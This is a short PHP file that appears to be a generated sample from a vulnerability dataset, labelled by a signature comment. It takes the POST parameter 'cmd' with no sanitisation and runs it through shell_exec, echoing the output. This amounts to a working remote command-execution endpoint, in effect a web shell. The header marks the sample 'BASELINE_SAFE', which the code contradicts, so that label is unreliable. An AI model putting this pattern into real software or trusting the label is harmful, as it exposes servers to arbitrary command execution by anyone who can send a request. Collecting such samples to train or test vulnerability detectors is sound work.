<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=BODY_POST; CE_MODE=FILTER_INPUT_POST; SKELETON=S1; KEY=cmd; SINK=B3; VAR=v0033 */
function SINK_B3($command){
    $output=shell_exec($command);
    echo $output;
}
$inp = (string)(filter_input(INPUT_POST, "cmd") ?? "");
$inp = (string)$inp; // no value processing
function run_sink($x){
    return SINK_B3($x);
}
$out = run_sink($inp);
echo (string)($out);
?>
